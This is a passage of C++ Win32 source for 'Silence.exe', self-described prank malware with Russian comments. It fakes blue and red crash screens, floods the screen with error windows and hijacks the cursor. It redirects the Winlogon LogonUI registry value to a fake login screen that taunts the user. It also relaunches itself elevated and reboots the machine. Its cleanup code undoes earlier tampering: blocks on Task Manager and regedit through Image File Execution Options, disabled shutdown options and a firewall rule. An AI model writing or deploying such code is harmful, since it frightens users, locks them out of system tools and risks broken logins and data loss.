    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    DEVMODEW dm = {};
    dm.dmSize = sizeof(dm);
    dm.dmPelsWidth = 1024; dm.dmPelsHeight = 768;
    dm.dmBitsPerPel = 32;
    dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_BITSPERPEL;
    if (ChangeDisplaySettingsW(&dm, CDS_FULLSCREEN) == DISP_CHANGE_SUCCESSFUL) {
        g_resolutionChanged = true;
    }
    SleepPump(300);

    int bw = GetSystemMetrics(SM_CXSCREEN);
    int bh = GetSystemMetrics(SM_CYSCREEN);

    std::thread tAudio(AudioThread, BytebeatBSOD, 8000, false);
    HDC hScreen = GetDC(nullptr);

    DWORD start = GetTickCount();
    int progress = 0;
    while ((int)(GetTickCount() - start) < 8000) {
        DWORD elapsed = GetTickCount() - start;
        progress = (int)(elapsed / 1000) * 15;
        if (progress > 100) progress = 100;

        HBRUSH bg = CreateSolidBrush(RGB(0, 120, 215));
        RECT full = { 0, 0, bw, bh }; FillRect(hScreen, &full, bg); DeleteObject(bg);

        SetBkMode(hScreen, TRANSPARENT);
        SetTextColor(hScreen, RGB(255, 255, 255));

        HFONT fSmile = CreateFontW(120, 0, 0, 0, FW_LIGHT, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        HFONT old = (HFONT)SelectObject(hScreen, fSmile);
        TextOutW(hScreen, bw/8, bh/8, L":(", 2);

        HFONT fText = CreateFontW(28, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        SelectObject(hScreen, fText);
        const wchar_t* mainText =
            L"Your PC ran into a problem and needs to restart. "
            L"We're just collecting some error info, and then we'll restart for you.";
        RECT tr = { bw/8, bh/3, bw - bw/8, bh/2 };
        DrawTextW(hScreen, mainText, -1, &tr, DT_LEFT | DT_TOP | DT_WORDBREAK);

        wchar_t progStr[32];
        swprintf_s(progStr, L"%d%% complete", progress);
        HFONT fProg = CreateFontW(22, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        SelectObject(hScreen, fProg);
        TextOutW(hScreen, bw/8, bh/2 + 20, progStr, (int)wcslen(progStr));

        int qrSize = 110;
        int qrX = bw/8, qrY = bh - 200;
        DrawFakeQR(hScreen, qrX, qrY, qrSize);

        HFONT fSmall = CreateFontW(14, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        SelectObject(hScreen, fSmall);
        TextOutW(hScreen, qrX + qrSize + 20, qrY,
                 L"For more information about this issue and possible fixes, visit https://www.windows.com/stopcode", 99);
        TextOutW(hScreen, qrX + qrSize + 20, qrY + 50,
                 L"If you call a support person, give them this info:", 52);
        TextOutW(hScreen, qrX + qrSize + 20, qrY + 75,
                 L"Stop code: CRITICAL_PROCESS_DIED", 33);

        SelectObject(hScreen, old);
        DeleteObject(fSmile); DeleteObject(fText); DeleteObject(fProg); DeleteObject(fSmall);
        Sleep(60);
    }

    // Фаза 10 — красный BSOD
    DWORD redStart = GetTickCount();
    while ((int)(GetTickCount() - redStart) < 4000) {
        HBRUSH bg = CreateSolidBrush(RGB(180, 0, 0));
        RECT full = { 0, 0, bw, bh }; FillRect(hScreen, &full, bg); DeleteObject(bg);

        SetBkMode(hScreen, TRANSPARENT);
        SetTextColor(hScreen, RGB(255, 255, 255));

        HFONT fSmile = CreateFontW(120, 0, 0, 0, FW_LIGHT, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        HFONT old = (HFONT)SelectObject(hScreen, fSmile);
        TextOutW(hScreen, bw/8, bh/8, L":)", 2);

        HFONT fText = CreateFontW(32, 0, 0, 0, FW_BOLD, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI");
        SelectObject(hScreen, fText);
        const wchar_t* redText =
            L"Что-то пошло совсем не так.\n\n"
            L"Мы пытались тебя спасти.\nМы не смогли.\n\n"
            L"Твоя система окончательно сломана.\n\n"
            L"STOP CODE: SILENCE_EXE_KILLED";
        RECT tr = { bw/8, bh/3, bw - bw/8, bh - bh/8 };
        DrawTextW(hScreen, redText, -1, &tr, DT_LEFT | DT_TOP | DT_WORDBREAK);
        SelectObject(hScreen, old);
        DeleteObject(fSmile); DeleteObject(fText);
        Sleep(60);
    }

    ReleaseDC(nullptr, hScreen);
    if (tAudio.joinable()) tAudio.join();
    if (g_resolutionChanged) {
        ChangeDisplaySettingsW(nullptr, 0);
        g_resolutionChanged = false;
    }
    SleepPump(500);
}

// ============================================================
// ФАЗА 11 — 30 ОШИБОК
// ============================================================
LRESULT CALLBACK SilenceErrProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(20, 0, 0));
        FillRect(dc, &rc, bg); DeleteObject(bg);
        HBRUSH frame = CreateSolidBrush(RGB(200, 0, 0));
        FrameRect(dc, &rc, frame); DeleteObject(frame);
        HICON hIcon = LoadIconW(nullptr, IDI_ERROR);
        DrawIconEx(dc, 12, 12, hIcon, 32, 32, 0, nullptr, DI_NORMAL);
        int idx = (int)GetWindowLongPtrW(h, GWLP_USERDATA);
        if (idx < 0 || idx >= kSilenceErrorsCount) idx = 0;
        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 50, 50));
        HFONT f = CreateFontW(22, 0, 0, 0, FW_BOLD, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Consolas");
        HFONT old = (HFONT)SelectObject(dc, f);
        RECT tr = { 60, 20, rc.right - 10, rc.bottom - 10 };
        DrawTextW(dc, kSilenceErrors[idx], -1, &tr, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
        SelectObject(dc, old); DeleteObject(f);
        EndPaint(h, &ps);
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

void RegisterSilenceErrClass() {
    WNDCLASSW wc = {};
    wc.hInstance = g_hInst; wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.lpfnWndProc = SilenceErrProc; wc.lpszClassName = L"SilenceErr";
    RegisterClassW(&wc);
}

void Phase11_Errors() {
    RegisterSilenceErrClass();
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 250, h = 120;
    g_errorWindows.clear();
    for (int i = 0; i < 30; ++i) {
        int x = rand() % (sw - w);
        int y = rand() % (sh - h);
        HWND hw = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
            L"SilenceErr", L"", WS_POPUP | WS_BORDER,
            x, y, w, h, nullptr, nullptr, g_hInst, nullptr);
        if (!hw) continue;
        SetWindowLongPtrW(hw, GWLP_USERDATA, i % kSilenceErrorsCount);
        ShowWindow(hw, SW_SHOWNOACTIVATE);
        UpdateWindow(hw);
        g_errorWindows.push_back(hw);
        SleepPump(80);
    }
    SleepPump(7000);
    for (HWND hw : g_errorWindows) { if (IsWindow(hw)) DestroyWindow(hw); }
    g_errorWindows.clear();
    PumpMessages();
    SleepPump(500);
}

// ============================================================
// ФАЗА 12+13 — LOGONUI REDIRECT
// ============================================================
bool IsRunningAsLogonUI() {
    DWORD flag = 0;
    if (!GetRegDword(HKEY_LOCAL_MACHINE, L"Software\\Silence", L"LogonMode", &flag)) return false;
    return flag == 1;
}

void InstallLogonUIReplacement() {
    wchar_t myPath[MAX_PATH];
    GetModuleFileNameW(nullptr, myPath, MAX_PATH);

    // Сохраняем оригинальный путь
    wchar_t origPath[MAX_PATH] = {};
    if (GetRegString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        L"LogonUI", origPath, sizeof(origPath))) {
        SetRegString(HKEY_LOCAL_MACHINE, L"Software\\Silence", L"OrigLogonUI", origPath);
    }

    // Устанавливаем наш
    SetRegString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        L"LogonUI", myPath);

    // Флаг
    SetRegDword(HKEY_LOCAL_MACHINE, L"Software\\Silence", L"LogonMode", 1);

    // RunOnce на восстановление (доп. страховка)
    const wchar_t* restoreCmd =
        L"cmd.exe /c "
        L"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" "
        L"/v LogonUI /t REG_SZ /d \"C:\\Windows\\System32\\LogonUI.exe\" /f";
    SetRegString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        L"SilenceLogonRestore", restoreCmd);
}

void RestoreOriginalLogonUI() {
    wchar_t origPath[MAX_PATH] = {};
    if (!GetRegString(HKEY_LOCAL_MACHINE, L"Software\\Silence", L"OrigLogonUI",
                      origPath, sizeof(origPath))) {
        wcscpy_s(origPath, L"C:\\Windows\\System32\\LogonUI.exe");
    }
    SetRegString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        L"LogonUI", origPath);
    SetRegDword(HKEY_LOCAL_MACHINE, L"Software\\Silence", L"LogonMode", 0);
}

// Фейковый LogonUI (запускается Windows как LogonUI)
int RunAsLogonUI() {
    // САМОЕ ПЕРВОЕ — восстанавливаем реестр, чтобы не зациклиться
    RestoreOriginalLogonUI();

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(nullptr);

    DWORD start = GetTickCount();
    while ((int)(GetTickCount() - start) < 5000) {
        // Тёмно-красный фон
        HBRUSH bg = CreateSolidBrush(RGB(60, 0, 0));
        RECT full = { 0, 0, sw, sh };
        FillRect(hScreen, &full, bg);
        DeleteObject(bg);

        SetBkMode(hScreen, TRANSPARENT);

        // Заголовок
        SetTextColor(hScreen, RGB(255, 200, 200));
        HFONT ft = CreateFontW(64, 0, 0, 0, FW_BOLD, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Segoe UI");
        HFONT old = (HFONT)SelectObject(hScreen, ft);
        RECT tr = { 0, sh/3, sw, sh/3 + 100 };
        DrawTextW(hScreen, L"Silence.exe", -1, &tr, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // Подсказка
        SetTextColor(hScreen, RGB(200, 100, 100));
        HFONT fs = CreateFontW(24, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Segoe UI");
        SelectObject(hScreen, fs);
        RECT sr = { 0, sh/2 + 50, sw, sh/2 + 90 };
        DrawTextW(hScreen, L"Введи пароль. Если сможешь.", -1, &sr,
                  DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        SelectObject(hScreen, old);
        DeleteObject(ft); DeleteObject(fs);

        Sleep(40);
    }

    ReleaseDC(nullptr, hScreen);
    return 0;
}

// ============================================================
// ФАЗА 14 — ОН ВСЁ ЕЩЁ ЗДЕСЬ
// ============================================================
void CursorLagThread() {
    POINT target, actual;
    GetCursorPos(&actual);
    while (!g_stop.load()) {
        if (g_cursorLagOn.load()) {
            GetCursorPos(&target);
            // Плавное движение к цели (низкий коэффициент = сильное отставание)
            actual.x = actual.x + (target.x - actual.x) * 2 / 10;
            actual.y = actual.y + (target.y - actual.y) * 2 / 10;
            SetCursorPos(actual.x, actual.y);
        } else {
            GetCursorPos(&actual);
        }
        Sleep(15);
    }
}

void ShowStillHereWindow() {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 300, h = 100;
    int x = sw / 2 - w / 2;
    int y = sh - 200;

    HWND hw = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_LAYERED,
        L"STATIC", L"",
        WS_POPUP | SS_CENTER | SS_CENTERIMAGE,
        x, y, w, h, nullptr, nullptr, g_hInst, nullptr);
    if (!hw) return;

    SetLayeredWindowAttributes(hw, 0, 220, LWA_ALPHA);
    SetWindowLongPtrW(hw, GWL_STYLE, GetWindowLongPtrW(hw, GWL_STYLE));
    SetWindowTextW(hw, L"Я всё ещё здесь.");
    ShowWindow(hw, SW_SHOWNOACTIVATE);
    UpdateWindow(hw);

    SleepPump(500);
    if (IsWindow(hw)) DestroyWindow(hw);
    PumpMessages();
}

void Phase14_HeIsStillHere() {
    // Показываем сообщение через 5 сек после входа
    SleepPump(5000);

    g_cursorLagOn = true;
    std::thread tCursor(CursorLagThread);
    std::thread tAudio(AudioThread, BytebeatPhase14, 0, true);

    DWORD start = GetTickCount();
    DWORD lastMsg  = start;
    DWORD lastBeep = start;
    DWORD lastWall = start;

    while (!g_stop.load() && (int)(GetTickCount() - start) < Cfg::kPhase14Ms) {
        DWORD now = GetTickCount();

        // Каждые 60 сек — окно
        if (now - lastMsg > 60000) {
            lastMsg = now;
            ShowStillHereWindow();
        }

        // Каждые 3 мин — низкий писк
        if (now - lastBeep > 180000) {
            lastBeep = now;
            Beep(50, 100);
        }

        // Каждые 5 мин — мерцание обоев
        if (now - lastWall > 300000) {
            lastWall = now;
            int sw = GetSystemMetrics(SM_CXSCREEN);
            int sh = GetSystemMetrics(SM_CYSCREEN);
            HDC hScreen = GetDC(nullptr);
            HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
            RECT full = { 0, 0, sw, sh };
            FillRect(hScreen, &full, black);
            DeleteObject(black);
            ReleaseDC(nullptr, hScreen);
            Sleep(80);
            // Восстанавливаем обои
            SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, nullptr,
                                  SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        Sleep(500);
    }

    g_cursorLagOn = false;
    g_audioStop = true;
    if (tCursor.joinable()) tCursor.join();
    if (tAudio.joinable()) tAudio.join();
}

// ============================================================
// ФИНАЛЬНАЯ ОЧИСТКА
// ============================================================
void FinalCleanup() {
    RemoveFromRun();

    // Восстанавливаем обои
    wchar_t origWall[MAX_PATH] = {};
    if (GetRegString(HKEY_CURRENT_USER, L"Software\\Silence",
                     L"OriginalWallpaper", origWall, sizeof(origWall))) {
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)origWall,
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }

    // Удаляем файлы с рабочего стола
    wchar_t desktop[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_DESKTOPDIRECTORY, nullptr, 0, desktop))) {
        for (int i = 1; i <= 10; ++i) {
            wchar_t path[MAX_PATH];
            swprintf_s(path, L"%s\\message_%02d.txt", desktop, i);
            DeleteFileW(path);
        }
    }

    // Убираем IFEO
    const wchar_t* ifeos[] = {
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe",
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe",
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe",
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe"
    };
    for (auto k : ifeos) {
        HKEY h;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, k, 0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
            RegDeleteValueW(h, L"Debugger");
            RegCloseKey(h);
        }
    }

    // Восстанавливаем питание
    HKEY h;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
        RegDeleteValueW(h, L"NoClose");
        RegDeleteValueW(h, L"StartMenuLogOff");
        RegCloseKey(h);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
        RegDeleteValueW(h, L"NoPowerOptions");
        RegCloseKey(h);
    }

    // Убираем firewall rule
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    wchar_t cmd[] = L"cmd.exe /c netsh advfirewall firewall delete rule name=\"SilenceBlock\"";
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    // Убираем наш ключ
    SetPhase(99);  // маркер что всё завершено

    // Финальное сообщение
    MessageBoxW(nullptr,
        L"Silence.exe закончил работу.\n\n"
        L"Все изменения откатились.\n"
        L"Это был пранк.",
        L"Silence.exe",
        MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
    SetProcessDPIAware();
    g_hInst = hInst;
    srand((unsigned)time(nullptr));

    HANDLE hMutex = CreateMutexW(nullptr, TRUE, L"SilenceMutex_v1");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    if (!IsElevated()) {
        RelaunchElevated();
        if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
        return 0;
    }

    // === ПРОВЕРКА: работаем ли мы как LogonUI? ===
    if (IsRunningAsLogonUI()) {
        RunAsLogonUI();
        if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
        return 0;
    }

    int phase = GetPhase();

    // ===== ПЕРВЫЙ ЗАПУСК =====
    if (phase == 0) {
        int r = MessageBoxW(nullptr,
            L"SILENCE.EXE\n\n"
            L"ВНИМАНИЕ!\n\n"
            L"Эта программа — ПРАНК.\n"
            L"Но она МОЖЕТ СИЛЬНО НАПУГАТЬ.\n\n"
            L"Запускайте ТОЛЬКО на виртуальной машине.\n"
            L"Могут произойти ошибки.\n"
            L"Данные могут быть утеряны.\n\n"
            L"Продолжить?",
            L"Silence.exe — предупреждение",
            MB_YESNO | MB_ICONWARNING | MB_TOPMOST);
        if (r != IDYES) {
            if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
            return 0;
        }
        DoInitialGlitch();
        Phase1_BlackDesktop();
        InstallToRun();
        SetPhase(3);
        SleepPump(1000);
        DoReboot();
        return 0;
    }

    // ===== ФАЗА 3 =====
    if (phase == 3) {
        SleepPump(2000);
        Phase3_Lockdown();
        phase = 4;
    }

    // ===== ФАЗА 4 =====
    if (phase == 4) {
        InstallKbHook();
        HideTaskbar();
        Phase4_Timer();
        SetPhase(5);
        phase = 5;
    }

    // ===== ФАЗА 6 =====
    if (phase == 5) {
        Phase6_ExplorerKilled();
        SetPhase(7);
        phase = 7;
    }

    // ===== ФАЗЫ 7+8 =====
    if (phase == 7) {
        Phase7_HelpUser();
        SetPhase(9);
        phase = 9;
    }

    // ===== ФАЗЫ 9+10 =====
    if (phase == 9) {
        Phase9_BSOD();
        SetPhase(11);
        phase = 11;
    }

    // ===== ФАЗА 11 + подготовка к LogonUI =====
    if (phase == 11) {
        Phase11_Errors();
        RemoveKbHook();
        ShowTaskbar();

        // Установка LogonUI replacement
        InstallLogonUIReplacement();
        SetPhase(12);

        SleepPump(2000);
        DoReboot();
        return 0;
    }

    // ===== ФАЗА 12 (после LogonUI и логина) =====
    if (phase == 12) {
        // LogonUI уже был показан (наш фейк). После логина — сразу фаза 14.
        SetPhase(14);
        phase = 14;
    }

    // ===== ФАЗА 14 =====
    if (phase == 14) {
        Phase14_HeIsStillHere();
        FinalCleanup();
    }

    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
    return 0;
}
